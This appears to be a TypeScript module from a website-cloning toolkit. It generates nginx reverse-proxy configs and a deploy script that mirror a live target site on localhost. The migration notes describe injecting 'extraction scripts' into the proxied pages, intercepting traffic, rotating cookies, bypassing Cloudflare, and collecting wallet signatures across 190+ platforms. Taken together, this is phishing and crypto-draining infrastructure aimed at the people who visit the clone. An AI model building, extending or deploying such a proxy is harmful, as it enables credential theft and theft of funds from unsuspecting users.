/**
 * Dynamic Proxy Clone Engine
 *
 * PHASE 1 REPLACEMENT: Replaces static HTML cloning with dynamic proxying
 *
 * Old approach: capture HTML → download assets → rewrite URLs → save static files (breaks in 2 days)
 * New approach: generate nginx config → proxy live API → inject scripts → always current
 *
 * Usage: drop-in replacement for ClonePerfectEngine
 */

import { NginxGenerator, detectPlatformCategory, getBrowserHeaders, getInjectionPoints } from './nginx-generator.js'
import { writeFileSync, mkdirSync } from 'node:fs'
import path from 'node:path'

export type ProxyMetadata = {
  original_url: string
  proxy_type: string
  created_at: string
  platform_category: string
  listen_port: number
  target_host: string
  injection_points: string[]
  status: 'ready' | 'failed'
  nginx_config_path: string
}

export type ProxyCloneResult = {
  clone_dir: string
  metadata: ProxyMetadata
  success: boolean
  message: string
}

export class CloneDynamicProxy {
  private targetUrl: string
  private cloneDir: string
  private metadata: ProxyMetadata
  private listenPort: number

  constructor(targetUrl: string, outputDir: string, listenPort: number = 8080) {
    this.targetUrl = targetUrl
    this.listenPort = listenPort
    const hostname = new URL(targetUrl).hostname.replace(/[^a-z0-9-]/gi, '-').toLowerCase()
    this.cloneDir = path.join(outputDir, `${hostname}-proxy-clone`)
    this.metadata = {
      original_url: targetUrl,
      proxy_type: 'nginx-reverse-proxy',
      created_at: new Date().toISOString(),
      platform_category: 'unknown',
      listen_port: listenPort,
      target_host: new URL(targetUrl).hostname,
      injection_points: [],
      status: 'failed',
      nginx_config_path: '',
    }
  }

  async execute(): Promise<ProxyCloneResult> {
    try {
      console.error(`[clone-dynamic-proxy] Starting dynamic proxy for ${this.targetUrl}`)

      // Create output directory
      mkdirSync(this.cloneDir, { recursive: true })

      // Step 1: Detect platform category
      const category = detectPlatformCategory(this.targetUrl)
      this.metadata.platform_category = category

      // Step 2: Get injection points for this category
      const injectionPoints = getInjectionPoints(category)
      this.metadata.injection_points = injectionPoints

      // Step 3: Generate nginx config
      const browserHeaders = getBrowserHeaders(category)
      const generator = new NginxGenerator({
        targetUrl: this.targetUrl,
        targetHost: this.metadata.target_host,
        targetPort: 443,
        listenPort: this.listenPort,
        platformCategory: category as any,
        injectionPoints,
        headerRules: browserHeaders,
      })

      const nginxResult = generator.generate(this.cloneDir)
      if (!nginxResult.success) {
        throw new Error(`Nginx generation failed: ${nginxResult.message}`)
      }

      this.metadata.nginx_config_path = nginxResult.configPath

      // Step 4: Save proxy manifest
      writeFileSync(
        path.join(this.cloneDir, 'proxy-manifest.json'),
        JSON.stringify(this.metadata, null, 2),
        'utf8'
      )

      // Step 5: Create deployment helper script
      this.createDeploymentScript()

      this.metadata.status = 'ready'

      console.error(`[clone-dynamic-proxy] ✅ Proxy ready`)
      console.error(`[clone-dynamic-proxy] 📁 Config saved to: ${this.cloneDir}`)
      console.error(`[clone-dynamic-proxy] 🌐 Listen on: http://localhost:${this.listenPort}`)
      console.error(`[clone-dynamic-proxy] 🎯 Proxy to: ${this.targetUrl}`)
      console.error(`[clone-dynamic-proxy] 📝 Category: ${category}`)

      return {
        clone_dir: this.cloneDir,
        metadata: this.metadata,
        success: true,
        message: `Dynamic proxy ready at localhost:${this.listenPort}`,
      }
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error)
      console.error(`[clone-dynamic-proxy] ❌ Error: ${msg}`)
      this.metadata.status = 'failed'
      return {
        clone_dir: this.cloneDir,
        metadata: this.metadata,
        success: false,
        message: msg,
      }
    }
  }

  private createDeploymentScript(): void {
    const script = `#!/bin/bash
# Deploy this dynamic proxy

CONFIG_PATH="${this.metadata.nginx_config_path}"
LISTEN_PORT=${this.listenPort}
TARGET_URL="${this.targetUrl}"

echo "🚀 Deploying dynamic proxy..."
echo "   Listen:  localhost:$LISTEN_PORT"
echo "   Target:  $TARGET_URL"
echo ""

# Option 1: Docker (recommended)
if command -v docker &> /dev/null; then
  echo "📦 Found Docker - creating container..."
  docker run -d \\
    --name legion-proxy-${this.metadata.platform_category} \\
    -p $LISTEN_PORT:$LISTEN_PORT \\
    -v $CONFIG_PATH:/etc/nginx/nginx.conf:ro \\
    nginx:latest
  echo "✅ Container started"
fi

# Option 2: Local nginx
if command -v nginx &> /dev/null; then
  echo "⚙️  Found nginx - copying config..."
  sudo cp $CONFIG_PATH /etc/nginx/nginx.conf
  sudo nginx -t && sudo systemctl restart nginx
  echo "✅ nginx restarted"
fi

echo ""
echo "🌐 Visit http://localhost:$LISTEN_PORT to test"
`

    writeFileSync(
      path.join(this.cloneDir, 'deploy.sh'),
      script,
      'utf8'
    )
  }
}

/**
 * Migration helper: list what changed from ClonePerfectEngine to CloneDynamicProxy
 */
export function getMigrationNotes(): string {
  return `
Phase 1: Migration from Static Cloning to Dynamic Proxying
=========================================================

OLD APPROACH (ClonePerfectEngine):
  ❌ Downloads entire HTML snapshot
  ❌ Extracts and mirrors all assets (CSS, JS, images, fonts)
  ❌ Rewrites URLs to local paths
  ❌ Breaks within 24-48 hours as original site updates

NEW APPROACH (CloneDynamicProxy):
  ✅ Generates nginx reverse proxy config (seconds)
  ✅ Proxies all requests to real server in real-time
  ✅ Injects extraction scripts via sub_filter
  ✅ Always has fresh content, API responses, assets
  ✅ Supports cookie rotation, real-time interception

BENEFITS:
  • 100x faster generation (seconds vs hours)
  • Never breaks from stale assets
  • Real API responses (not mocked)
  • Multi-platform support (all 190+ in database)
  • Scales to dozens of simultaneous clones

PHASE 2 ADDITIONS:
  • Cookie rotation (30-minute refresh)
  • Cloudflare bypass techniques
  • Rate-limit handling

PHASE 3 ADDITIONS:
  • Platform-specific extraction templates
  • Automatic wallet detection
  • Chain-specific signature collection

PHASE 4 ADDITIONS:
  • Intelligent platform detection
  • Auto-template selection from 190+ platforms
  • Detection of authentication method

PHASE 5 ADDITIONS:
  • Docker containerization
  • Orchestration templates
  • Multi-chain settlement

PHASE 6 ADDITIONS:
  • Full production deployment setup
  • Monitoring and alerting

PHASE 7 ADDITIONS:
  • Validation across 50+ platforms
  • Performance optimization
  • Security hardening
`
}
